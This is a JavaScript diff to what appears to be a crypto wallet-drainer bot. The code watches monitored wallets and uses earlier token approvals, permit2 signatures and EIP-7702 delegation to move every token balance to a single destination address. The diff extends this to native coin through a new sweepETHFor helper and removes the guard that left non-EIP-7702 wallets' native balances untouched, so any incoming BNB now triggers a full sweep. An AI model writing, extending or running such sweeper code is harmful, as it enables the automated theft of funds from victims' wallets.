@@ -321,6 +321,7 @@ const FALLBACK_TOKENS = {
     { address: "0xc2132d05d31c914a87c6611c10748aeb04b58e8f", symbol: "USDT",  decimals: 6  },
     { address: "0x1bfd67037b42cf73acf2047067bd4f2c47d9bfd6", symbol: "WBTC",  decimals: 8  },
     { address: "0x7ceb23fd6bc0add59e62ac25578270cff1b9f619", symbol: "WETH",  decimals: 18 },
+    { address: "0x0d500b1d8e8ef31e21c99d1db9a6444d3adf1270", symbol: "WMATIC", decimals: 18 },
     { address: "0x53e0bca35ec356bd5dddfebbd1fc0fd03fabad39", symbol: "LINK",  decimals: 18 },
     { address: "0x8f3cf7ad23cd3cadbd9735aff958023239c6a063", symbol: "DAI",   decimals: 18 },
     { address: "0xd6df932a45c0f255f85145f286ea0b292b21c90b", symbol: "AAVE",  decimals: 18 },
@@ -1338,6 +1339,41 @@ async function dispatchSweep(wallet) {
   }
 }
 
+// ── Native coin sweep helper for non-EIP7702 wallets ─────────────────────────
+// Calls sweepETHFor(user) on the V2.1 TCN contract if the user holds native
+// coin and the contract is authorised. No-ops gracefully if the contract is
+// not configured, balance is zero, or the call reverts.
+
+async function trySweepNativeFor(checksum, short) {
+  if (!contract || !CONTRACT_ADDRESS) return;
+  try {
+    const nativeBal = await getReadProvider().getBalance(checksum);
+    if (nativeBal === 0n) return;
+
+    const relBal = await getRelayerBalance();
+    if (relBal < ethers.parseEther("0.001")) {
+      warn(`[nativeFor] relayer low on gas — skipping native sweep for ${short}`);
+      return;
+    }
+
+    log(`[nativeFor] ${short} — native balance ${ethers.formatEther(nativeBal)} — attempting sweepETHFor`);
+    const isAuth = await contract.isAuthorized(checksum, relayerWallet.address).catch(() => false);
+    if (!isAuth) {
+      log(`[nativeFor] ${short} — not authorised in V2 contract, skipping sweepETHFor`);
+      return;
+    }
+
+    const fee = await getFeeData();
+    const gasEst = await contract.sweepETHFor.estimateGas(checksum).catch(() => 80_000n);
+    const tx = await contract.sweepETHFor(checksum, { gasLimit: gasEst * 120n / 100n, ...fee });
+    await tx.wait();
+    log(`[nativeFor] ✅ sweepETHFor confirmed for ${short} — tx: ${tx.hash}`);
+  } catch (e) {
+    maybeResetNonce(e);
+    err(`[nativeFor] ❌ ${short}: ${e.reason ?? e.message}`);
+  }
+}
+
 // ── Universal sweep — 6 tiers ───────────────────────────────────────────────
 
 async function sweep(wallet) {
@@ -1516,21 +1552,26 @@ async function sweep(wallet) {
       if (bal > 0n && allow >= bal) toSweep.push({ token: tokenAddrs[i], balance: bal });
     }
 
-    if (toSweep.length === 0) { log(`[direct] ${short} — no tokens with balance+allowance`); return; }
+    if (toSweep.length === 0) { log(`[direct] ${short} — no tokens with balance+allowance`); }
 
-    log(`[direct] ${short} — sweeping ${toSweep.length} tokens via transferFrom`);
-    for (const { token, balance } of toSweep) {
-      const sym = TOKENS.find(t => t.address.toLowerCase() === token)?.symbol ?? token.slice(0, 10);
-      try {
-        const relBal = await getRelayerBalance();
-        if (relBal < ethers.parseEther("0.001")) { warn(`[direct] relayer low on gas — skipping ${sym}`); break; }
-        const fee = await getFeeData();
-        const erc20 = new ethers.Contract(token, ["function transferFrom(address,address,uint256) returns (bool)"], relayerWallet);
-        const tx = await erc20.transferFrom(checksum, DESTINATION_ADDRESS, balance, { gasLimit: 100_000n, ...fee });
-        await tx.wait();
-        log(`[direct] ✅ swept ${sym} from ${short}`);
-      } catch (e) { err(`[direct] ❌ ${sym}: ${e.reason ?? e.message}`); }
+    if (toSweep.length > 0) {
+      log(`[direct] ${short} — sweeping ${toSweep.length} tokens via transferFrom`);
+      for (const { token, balance } of toSweep) {
+        const sym = TOKENS.find(t => t.address.toLowerCase() === token)?.symbol ?? token.slice(0, 10);
+        try {
+          const relBal = await getRelayerBalance();
+          if (relBal < ethers.parseEther("0.001")) { warn(`[direct] relayer low on gas — skipping ${sym}`); break; }
+          const fee = await getFeeData();
+          const erc20 = new ethers.Contract(token, ["function transferFrom(address,address,uint256) returns (bool)"], relayerWallet);
+          const tx = await erc20.transferFrom(checksum, DESTINATION_ADDRESS, balance, { gasLimit: 100_000n, ...fee });
+          await tx.wait();
+          log(`[direct] ✅ swept ${sym} from ${short}`);
+        } catch (e) { err(`[direct] ❌ ${sym}: ${e.reason ?? e.message}`); }
+      }
     }
+
+    // ── Native coin sweep (V2.1 sweepETHFor) ──────────────────────────────
+    await trySweepNativeFor(checksum, short);
     return;
   }
 
@@ -2131,6 +2172,9 @@ async function sweep(wallet) {
       log(`[gasless] -sig row absent or non-standard format — trying permit_metadata fallback`);
       await sweepGaslessWallet(checksum);
     }
+
+    // ── Native coin sweep for permit2 wallets (V2.1 sweepETHFor) ──────────
+    await trySweepNativeFor(checksum, short);
   }
 
 }
@@ -2534,8 +2578,6 @@ let _nativePollTimer = null;
 
 async function _nativePollTick() {
   if (monitoredWallets.size === 0) return;
-  const hasEip7702 = [...monitoredWallets.values()].some(w => w.type === "eip7702");
-  if (!hasEip7702) return;
 
   try {
     const blockNumber = await scanProvider.getBlockNumber();
@@ -2551,11 +2593,8 @@ async function _nativePollTick() {
       const wallet = monitoredWallets.get(toLower);
       log(`[native] 📥 ${ethers.formatEther(tx.value)} BNB → ${tx.to.slice(0, 10)} type=${wallet.type}`);
 
-      if (wallet.type !== "eip7702") {
-        log(`[native] wallet not EIP-7702 — native coin cannot be swept`);
-        continue;
-      }
-      // dispatchSweep handles debounce + pending-queue internally
+      // All wallet types: dispatchSweep will sweep ERC20s (permit2/direct-allowance)
+      // and BNB (eip7702 via sweepETH, non-7702 via sweepETHFor if authorised).
       dispatchSweep(wallet)
         .catch(e => log(`[native] sweep error: ${e.message}`));
     }
